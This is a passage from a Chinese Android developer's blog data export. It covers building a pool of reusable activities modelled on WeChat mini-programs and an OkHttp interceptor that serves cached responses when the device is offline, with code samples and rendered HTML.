命令后，可以找到最近任务列表的Activity信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Running activities (most recent first):</span><br><span class=\"line\">  TaskRecord&#123;caccd90 #3239 A=.AppBrandUI3 U=0 StackId=1 sz=1&#125;</span><br><span class=\"line\">    Run #4: ActivityRecord&#123;bb162b8 u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI3 t3239&#125;</span><br><span class=\"line\">  TaskRecord&#123;d6c62d6 #3190 A=com.tencent.mm U=0 StackId=1 sz=1&#125;</span><br><span class=\"line\">    Run #3: ActivityRecord&#123;7f2d805 u0 com.tencent.mm/.ui.LauncherUI t3190&#125;</span><br><span class=\"line\">  TaskRecord&#123;34a386a #3238 A=.AppBrandUI2 U=0 StackId=1 sz=1&#125;</span><br><span class=\"line\">    Run #2: ActivityRecord&#123;16cfede u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI2 t3238&#125;</span><br><span class=\"line\">  TaskRecord&#123;7ade2d1 #3237 A=.AppBrandUI U=0 StackId=1 sz=1&#125;</span><br><span class=\"line\">    Run #1: ActivityRecord&#123;ccfd8ae u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI t3237&#125;</span><br><span class=\"line\">  ...</span><br></pre></td></tr></table></figure>\n\n<p>可以发现这里的#3是微信主Activity，4、2、1都是我开的小程序，且位于不同的任务栈中，Activity名称都是AppBrandUI+数字的形式。<br>然后再看看其他关键信息（这里我单独筛出来）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">packageName=com.tencent.mm processName=com.tencent.mm</span><br><span class=\"line\">taskAffinity=com.tencent.mm</span><br><span class=\"line\"></span><br><span class=\"line\">packageName=com.tencent.mm processName=com.tencent.mm:appbrand3</span><br><span class=\"line\">taskAffinity=.AppBrandUI3</span><br><span class=\"line\"></span><br><span class=\"line\">packageName=com.tencent.mm processName=com.tencent.mm:appbrand2</span><br><span class=\"line\">taskAffinity=.AppBrandUI2</span><br><span class=\"line\"></span><br><span class=\"line\">packageName=com.tencent.mm processName=com.tencent.mm:appbrand</span><br><span class=\"line\">taskAffinity=.AppBrandUI</span><br></pre></td></tr></table></figure>\n\n<p>很简单，和我们平时实现多进程差不多，说明是给Activity设置了process属性。</p>\n<h2 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h2><p>转念一想，小程序那么多，难道这些不同后缀的Activity都写死在代码里吗？<br>显然不能这么干，只能两种途径可以达成目的：</p>\n<ul>\n<li>不在Manifest里面静态注册Activity，使用类似Hook的方式动态创建进程和Activity</li>\n<li>动静结合，设计一个Activity池，在本地写死有限数量的Activity，通过复用的方式承载小程序</li>\n</ul>\n<p>对于第一种，我查阅了一些资料，理论上讲是可以做到的，涉及到NDK开发，需要我们对AMS的源码很熟悉，不走常规流程启动Activity，且小程序是多进程的，可能还需要手动fork进程。<br>这种方式显然具有较大的风险，属于黑科技范畴，而且谷歌官方是不推荐的，微信作为十几亿用户的常驻App，几乎不太可能使用这一方案。</p>\n<p>那么只剩第二种了，预先在本地写死n个一样的Activity（当然也可以通过继承形式），同时在Manifest中注册好。<br>然后打开一个小程序就占用一个Activity，当打开第n+1个小程序时，覆盖第1个小程序所在的Activity，这样就相当于第1个小程序被顶掉了。</p>\n<p>分析到此，就很明显了，如果真的是第二种方案，那么小程序就不能无限数量地打开咯？果断打开微信试了一下，果然，最多只能开5个！当你启动第6个小程序时，第1个就被销毁了。<br>其实这也是符合我们上述预期的，每个小程序的进程不一样，taskAffinity也不一样，类名也不一样。原生API是不支持动态设置taskAffinity和进程名的。</p>\n<h2 id=\"简单实现\"><a href=\"#简单实现\" class=\"headerlink\" title=\"简单实现\"></a>简单实现</h2><p>小程序所在的Activity：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SmallActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small0</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small1</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small2</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small3</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small4</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(<span class=\"meta\">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_small);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 动态地给小程序Activity设置名称和图标，下面代码只是举例，实际信息肯定是动态获取的</span></span><br><span class=\"line\">        <span class=\"comment\">// 由于iconRes这个构造参数的API 28才加入的，所以建议区分版本</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">iconRes</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; <span class=\"comment\">// 这里应该是小程序图标的资源索引</span></span><br><span class=\"line\">            setTaskDescription(<span class=\"keyword\">new</span> <span class=\"title class_\">ActivityManager</span>.TaskDescription(<span class=\"string\">&quot;小程序名&quot;</span>, iconRes));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Bitmap</span> <span class=\"variable\">iconBmp</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>; <span class=\"comment\">// 这里应该是小程序图标的bitmap</span></span><br><span class=\"line\">            setTaskDescription(<span class=\"keyword\">new</span> <span class=\"title class_\">ActivityManager</span>.TaskDescription(<span class=\"string\">&quot;小程序名&quot;</span>, iconBmp));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Manifest：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:tools</span>=<span class=\"string\">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">package</span>=<span class=\"string\">&quot;com.ysy.smallapp&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">application</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small0&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small1&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small2&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small2&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small2&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small2&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small3&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small3&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small3&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small3&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small4&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small4&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small4&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small4&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">application</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>具体的复用逻辑这里暂时就这样简单地实现了，实际情况肯定比此复杂：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> : <span class=\"type\">AppCompatActivity</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onCreate</span><span class=\"params\">(savedInstanceState: <span class=\"type\">Bundle</span>?)</span></span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState)</span><br><span class=\"line\">        setContentView(R.layout.activity_main)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">val</span> edtText = findViewById&lt;EditText&gt;(R.id.edt_main)</span><br><span class=\"line\"></span><br><span class=\"line\">        findViewById&lt;View&gt;(R.id.btn_main).setOnClickListener &#123;</span><br><span class=\"line\">            startActivity(Intent().apply &#123;</span><br><span class=\"line\">                <span class=\"keyword\">val</span> id = edtText.text.toString().toInt() % <span class=\"number\">5</span></span><br><span class=\"line\">                setClassName(<span class=\"keyword\">this</span><span class=\"symbol\">@MainActivity</span>, <span class=\"string\">&quot;com.ysy.smallapp.SmallActivity\\$Small<span class=\"variable\">$id</span>&quot;</span>)</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>完整源码：<br><a href=\"https://github.com/ysy950803/SmallApp\">https://github.com/ysy950803/SmallApp</a></p>\n"},{"layout":"post","title":"OkHttp拦截器实现无网络时加载缓存，避免Unknown host异常","subtitle":"拦截器玩出花。","date":"2019-07-04T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n我们在创建OkHttp客户端时，可以添加接口数据缓存，真的很香：\n\n```java\nFile cacheDir = ... // 缓存目录，可以是内部存储也可以是外部存储的目录\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n        .connectTimeout(10, TimeUnit.SECONDS)\n        .cache(new Cache(cacheDir, 20 * 1024 * 1024)) // 这里给了20MB缓存目录容量，超过后会自动清理\n        ....\n        .build();\n```\n\n然后我们会发现，先正常请求网络数据，然后断开网络连接，重新请求，并没有返回缓存。\n而是出现一些诸如“Unknown host…”解析不了域名这种异常，查看之前设置的缓存文件目录，也确实有文件，可怎么就不加载呢？\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190705234709502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n哦，结果还要配置一下缓存策略，回到我们的主题：拦截器。\n我们可以在拦截器中实现网络连接判断并强制开起缓存：\n\n```java\nprivate static class CacheInterceptor implements Interceptor {\n    @Override\n    public okhttp3.Response intercept(Chain chain) throws IOException {\n        Request request = chain.request();\n        Request.Builder requestBuilder = request.newBuilder();\n        if (/*手机没联网*/) {\n            requestBuilder.cacheControl(CacheControl.FORCE_CACHE); // 直接使用缓存\n        }\n        return chain.proceed(requestBuilder.build());\n    }\n}\n... // 然后记得给Client添加拦截器\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n        ....\n        .addInterceptor(new CacheInterceptor())\n        .build();\n```\n\n如此一来，断开网络后，就会正确地加载缓存数据了。\n","source":"_posts/2019-07-05-OkHttp拦截器实现无网络时加载缓存，避免Unknown host异常.md","raw":"---\nlayout:     post\ntitle:      OkHttp拦截器实现无网络时加载缓存，避免Unknown host异常\nsubtitle:   拦截器玩出花。\ndate:       2019-07-05\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n我们在创建OkHttp客户端时，可以添加接口数据缓存，真的很香：\n\n```java\nFile cacheDir = ... // 缓存目录，可以是内部存储也可以是外部存储的目录\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n        .connectTimeout(10, TimeUnit.SECONDS)\n        .cache(new Cache(cacheDir, 20 * 1024 * 1024)) // 这里给了20MB缓存目录容量，超过后会自动清理\n        ....\n        .build();\n```\n\n然后我们会发现，先正常请求网络数据，然后断开网络连接，重新请求，并没有返回缓存。\n而是出现一些诸如“Unknown host…”解析不了域名这种异常，查看之前设置的缓存文件目录，也确实有文件，可怎么就不加载呢？\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190705234709502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n哦，结果还要配置一下缓存策略，回到我们的主题：拦截器。\n我们可以在拦截器中实现网络连接判断并强制开起缓存：\n\n```java\nprivate static class CacheInterceptor implements Interceptor {\n    @Override\n    public okhttp3.Response intercept(Chain chain) throws IOException {\n        Request request = chain.request();\n        Request.Builder requestBuilder = request.newBuilder();\n        if (/*手机没联网*/) {\n            requestBuilder.cacheControl(CacheControl.FORCE_CACHE); // 直接使用缓存\n        }\n        return chain.proceed(requestBuilder.build());\n    }\n}\n... // 然后记得给Client添加拦截器\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n        ....\n        .addInterceptor(new CacheInterceptor())\n        .build();\n```\n\n如此一来，断开网络后，就会正确地加载缓存数据了。\n","slug":"OkHttp拦截器实现无网络时加载缓存，避免Unknown host异常","published":1,"updated":"2024-03-25T07:31:25.854Z","comments":1,"photos":[],"link":"","_id":"cluaufh0l000wthe6cembg2h6","content":"<p>我们在创建OkHttp客户端时，可以添加接口数据缓存，真的很香：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">File</span> <span class=\"variable\">cacheDir</span> <span class=\"operator\">=</span> ... <span class=\"comment\">// 缓存目录，可以是内部存储也可以是外部存储的目录</span></span><br><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">okHttpClient</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">        .connectTimeout(<span class=\"number\">10</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">        .cache(<span class=\"keyword\">new</span> <span class=\"title class_\">Cache</span>(cacheDir, <span class=\"number\">20</span> * <span class=\"number\">1024</span> * <span class=\"number\">1024</span>)) <span class=\"comment\">// 这里给了20MB缓存目录容量，超过后会自动清理</span></span><br><span class=\"line\">        ....</span><br><span class=\"line\">        .build();</span><br></pre></td></tr></table></figure>\n\n<p>然后我们会发现，先正常请求网络数据，然后断开网络连接，重新请求，并没有返回缓存。<br>而是出现一些诸如“Unknown host…”解析不了域名这种异常，查看之前设置的缓存文件目录，也确实有文件，可怎么就不加载呢？<br><img src=\"https://imgconvert.csdnimg.cn/20190705234709502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>哦，结果还要配置一下缓存策略，回到我们的主题：拦截器。<br>我们可以在拦截器中实现网络连接判断并强制开起缓存：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CacheInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Interceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> okhttp3.Response <span class=\"title function_\">intercept</span><span class=\"params\">(Chain chain)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> chain.request();</span><br><span class=\"line\">        Request.<span class=\"type\">Builder</span> <span class=\"variable\">requestBuilder</span> <span class=\"operator\">=</span> request.newBuilder();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"comment\">/*手机没联网*/</span>) &#123;</span><br><span class=\"line\">            requestBuilder.cacheControl(CacheControl.FORCE_CACHE); <span class=\"comment\">// 直接使用缓存</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chain.proceed(requestBuilder.build());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">... <span class=\"comment\">// 然后记得给Client添加拦截器</span></span><br><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">okHttpClient</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">        ....</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">CacheInterceptor</span>())</span><br><span class=\"line\">        .build();</span><br></pre></td></tr></table></figure>\n\n<p>如此一来，断开网络后，就会正确地加载缓存数据了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>我们在创建OkHttp客户端时，可以添加接口数据缓存，真的很香：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">File</span> <span class=\"variable\">cacheDir</span> <span class=\"operator\">=</span> ... <span class=\"comment\">// 缓存目录，可以是内部存储也可以是外部存储的目录</span></span><br><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">okHttpClient</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">        .connectTimeout(<span class=\"number\">10</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">        .cache(<span class=\"keyword\">new</span> <span class=\"title class_\">Cache</span>(cacheDir, <span class=\"number\">20</span> * <span class=\"number\">1024</span> * <span class=\"number\">1024</span>)) <span class=\"comment\">// 这里给了20MB缓存目录容量，超过后会自动清理</span></span><br><span class=\"line\">        ....</span><br><span class=\"line\">        .build();</span><br></pre></td></tr></table></figure>\n\n<p>然后我们会发现，先正常请求网络数据，然后断开网络连接，重新请求，并没有返回缓存。<br>而是出现一些诸如“Unknown host…”解析不了域名这种异常，查看之前设置的缓存文件目录，也确实有文件，可怎么就不加载呢？<br><img src=\"https://imgconvert.csdnimg.cn/20190705234709502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>哦，结果还要配置一下缓存策略，回到我们的主题：拦截器。<br>我们可以在拦截器中实现网络连接判断并强制开起缓存：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CacheInterceptor</span> <span 